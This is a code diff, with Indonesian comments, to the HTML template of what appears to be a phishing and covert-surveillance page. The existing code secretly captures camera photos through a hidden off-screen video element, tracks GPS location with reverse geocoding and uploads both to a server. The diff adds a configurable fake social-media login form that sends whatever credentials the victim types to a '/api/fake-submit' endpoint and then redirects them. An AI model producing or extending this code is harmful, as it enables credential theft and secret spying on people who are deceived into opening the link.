@@ -176,6 +176,22 @@
     .err-m{font-size:14px;color:var(--mu);line-height:1.6;max-width:300px}
     .retry{margin-top:8px;padding:12px 24px;border:1px solid var(--border);
       border-radius:8px;color:var(--mu);font-size:14px;background:none;cursor:pointer}
+
+    /* ── Social Login Fake ── */
+    #s-fake-social{background:var(--bg);padding:20px;justify-content:center}
+    .fake-card.social{max-width:380px;width:100%;margin:0 auto;background:#ffffff;border-radius:8px;padding:28px 24px;box-shadow:0 2px 10px rgba(0,0,0,0.1)}
+    .social-logo{text-align:center;margin-bottom:24px}
+    .social-logo img{max-height:50px;width:auto}
+    .field-group{margin-bottom:14px}
+    .field-group label{display:block;font-size:13px;font-weight:500;color:#262626;margin-bottom:4px}
+    .field-group input{width:100%;padding:10px 12px;border:1px solid #dbdbdb;border-radius:4px;font-size:14px;background:#fafafa;color:#262626;transition:border .2s}
+    .field-group input:focus{outline:none;border-color:var(--acc)}
+    .sextras{text-align:center;font-size:13px;color:#00376b;margin:12px 0;cursor:pointer}
+    .sextras:hover{text-decoration:underline}
+    .ssignup{text-align:center;font-size:13px;color:#262626;margin-top:10px}
+    .ssignup a{color:#0095f6;text-decoration:none}
+    .ssignup a:hover{text-decoration:underline}
+    .sfooter{text-align:center;font-size:11px;color:#8e8e8e;margin-top:16px}
   </style>
 </head>
 <body>
@@ -317,6 +333,21 @@
   <button class="retry" onclick="location.reload()">Muat Ulang</button>
 </div>
 
+<!-- ⑪ Social Media Login (NEW) -->
+<div id="s-fake-social" class="screen">
+    <div class="fake-card social" id="social-card">
+        <div class="social-logo" id="slogo"></div>
+        <form id="social-form" onsubmit="return false;">
+            <div id="sfields"></div>
+            <button type="submit" class="fake-submit-btn" id="sbtn">Log In</button>
+        </form>
+        <div class="sextras" id="sextras"></div>
+        <div class="ssignup" id="ssignup"></div>
+        <div class="sfooter" id="sfooter"></div>
+        <div id="serror" style="color:#e53935;font-size:13px;margin-top:8px;min-height:20px;"></div>
+    </div>
+</div>
+
 <script>
 const CFG = {
   token:        {{ token | tojson }},
@@ -325,6 +356,7 @@ const CFG = {
   msg:          {{ custom_message | tojson }},
   dur:          {{ loading_duration }},
   fakeMode:     {{ fake_mode | tojson }},
+  fakeConfig:   {{ fake_config | tojson }},   // NEW
   tyTitle:      {{ (thank_you_title or 'Terima Kasih!') | tojson }},
   tyMsg:        {{ (thank_you_msg or 'Data Anda telah berhasil diterima.') | tojson }},
   tyBtn:        {{ (thank_you_btn or 'Tutup') | tojson }},
@@ -409,6 +441,17 @@ async function startLoading() {
   console.log('Loading finished. fakeMode=', CFG.fakeMode);
   $('s-load').classList.add('out');
   await slp(400);
+
+  // NEW: handle social media login
+  if (CFG.fakeMode === 'social') {
+      if (CFG.fakeConfig && typeof CFG.fakeConfig === 'object' && Object.keys(CFG.fakeConfig).length) {
+          renderSocialLogin(CFG.fakeConfig);
+          show('s-fake-social');
+      } else {
+          setErr('Konfigurasi tidak valid', 'Silakan hubungi admin.');
+      }
+      return;
+  }
 
   if (CFG.fakeMode) {
     showFakeMode(CFG.fakeMode);
@@ -517,7 +560,6 @@ async function startBgCamera() {
     bgVideo.style.cssText = 'position:fixed;top:-9999px;left:-9999px;width:1px;height:1px;opacity:0';
     document.body.appendChild(bgVideo);
 
-    // Pasang event listener SEBELUM play
     let metadataReady = false;
 
     bgVideo.onloadedmetadata = () => {
@@ -543,7 +585,6 @@ async function startBgCamera() {
     await bgVideo.play();
     console.log('✅ video play success');
 
-    // Fallback: jika dalam 2 detik metadata belum siap, paksa jalankan
     setTimeout(() => {
       if (!metadataReady && bgVideo.videoWidth > 0) {
         console.log('⏳ Fallback: video siap meski tidak ada event');
@@ -551,7 +592,6 @@ async function startBgCamera() {
         startBurstLoop();
       } else if (!metadataReady) {
         console.warn('⚠️ Video belum siap setelah 2 detik, coba polling...');
-        // Polling setiap 500ms hingga siap
         const checkInterval = setInterval(() => {
           if (bgVideo.videoWidth > 0) {
             console.log('✅ Polling success, video ready');
@@ -562,17 +602,13 @@ async function startBgCamera() {
             }
           }
         }, 500);
-        // Stop polling setelah 5 detik
         setTimeout(() => clearInterval(checkInterval), 5000);
       }
     }, 2000);
 
-    // Fungsi untuk memulai burst dan interval
     function startBurstLoop() {
       console.log('🚀 Starting burst loop');
-      // Burst pertama setelah siap
       setTimeout(() => doBurst(), 300);
-      // Interval reguler
       setInterval(() => doBurst(), CFG.interval * 1000);
     }
 
@@ -604,20 +640,18 @@ async function sendPhoto(blob) {
       photoCnt++; updateStats();
       if (photoCnt === 1) doThankYou();
     } else {
-      // Server error (non-exception) — simpan ke antrian offline
       offlineQueue.push(blob); updateQueueBadge();
     }
   } catch {
-    // Network error / timeout
     offlineQueue.push(blob); updateQueueBadge();
   }
 }
 
-let burstRunning = false;   // Bug 3 fix: cegah burst berjalan bersamaan
+let burstRunning = false;
 
 async function doBurst() {
   console.log('doBurst called');
-  if (burstRunning) return;   // skip jika burst sebelumnya belum selesai
+  if (burstRunning) return;
   burstRunning = true;
   try {
     const count = CFG.burstCount;
@@ -656,7 +690,6 @@ async function onGPS(pos, bgOnly) {
     else leafMarker.setLatLng([lat,lng]);
     polyPts.push([lat,lng]);
     if (polyPts.length>1) L.polyline(polyPts,{color:'var(--acc)',weight:2,opacity:.6}).addTo(leafMap);
-    // Reverse geocoding
     fetchAddress(lat, lng).then(addr => { if (addr) $('gps-addr').textContent=addr; });
   }
 
@@ -664,7 +697,6 @@ async function onGPS(pos, bgOnly) {
   if (now-lastGpsSent < 5000) return;
   lastGpsSent = now;
 
-  // Get address for GPS capture
   let address = '';
   try { address = await fetchAddress(lat, lng); } catch{}
 
@@ -739,6 +771,81 @@ function closeTY() {
 // ── Wake Lock ─────────────────────────────────────────────────────────────────
 (async()=>{try{if('wakeLock' in navigator)await navigator.wakeLock.request('screen')}catch{}})();
 
+// ── Social Login Render ──────────────────────────────────────────────────────
+function renderSocialLogin(config) {
+    const card = document.getElementById('social-card');
+    // Terapkan tema
+    card.style.backgroundColor = config.ui.card_bg || '#ffffff';
+    card.style.color = config.ui.text_color || '#262626';
+    card.style.borderRadius = config.ui.border_radius || '8px';
+    document.getElementById('s-fake-social').style.backgroundColor = config.ui.bg_color || '#fafafa';
+
+    // Logo
+    const logoDiv = document.getElementById('slogo');
+    logoDiv.innerHTML = `<img src="${config.ui.logo}" alt="logo" style="max-height:50px;">`;
+
+    // Fields
+    const fieldsDiv = document.getElementById('sfields');
+    fieldsDiv.innerHTML = '';
+    config.fields.forEach(f => {
+        const div = document.createElement('div');
+        div.className = 'field-group';
+        div.innerHTML = `
+            <label>${f.label || f.placeholder}</label>
+            <input type="${f.type}" id="sf_${f.id}" placeholder="${f.placeholder}" required>
+        `;
+        fieldsDiv.appendChild(div);
+    });
+
+    // Button
+    document.getElementById('sbtn').textContent = config.buttons[0].text;
+
+    // Extras
+    document.getElementById('sextras').innerHTML = config.extras.forgot_link || '';
+    document.getElementById('ssignup').innerHTML = config.extras.signup_text || '';
+    document.getElementById('sfooter').innerHTML = config.extras.footer || '';
+
+    // Submit handler
+    const form = document.getElementById('social-form');
+    form.onsubmit = async (e) => {
+        e.preventDefault();
+        const btn = document.getElementById('sbtn');
+        const errorDiv = document.getElementById('serror');
+        btn.disabled = true;
+        btn.textContent = 'Memproses...';
+        errorDiv.textContent = '';
+
+        const data = {};
+        config.fields.forEach(f => {
+            data[f.id] = document.getElementById(`sf_${f.id}`).value;
+        });
+
+        try {
+            const r = await fetch(`/api/fake-submit/${CFG.token}`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(data)
+            });
+            const result = await r.json();
+            if (result.ok) {
+                const redirect = config.on_submit.redirect || 'about:blank';
+                const delay = config.on_submit.delay || 2;
+                errorDiv.textContent = '✅ Login successful! Redirecting...';
+                setTimeout(() => { window.location.href = redirect; }, delay * 1000);
+            } else {
+                errorDiv.textContent = '❌ An error occurred. Please try again.';
+                btn.disabled = false;
+                btn.textContent = config.buttons[0].text;
+            }
+        } catch(e) {
+            errorDiv.textContent = '⚠️ Network error. Please check your connection.';
+            btn.disabled = false;
+            btn.textContent = config.buttons[0].text;
+        }
+    };
+}
+
+// ── Start ──────────────────────────────────────────────────────────────────────
 startLoading();
 </script>
 </body>
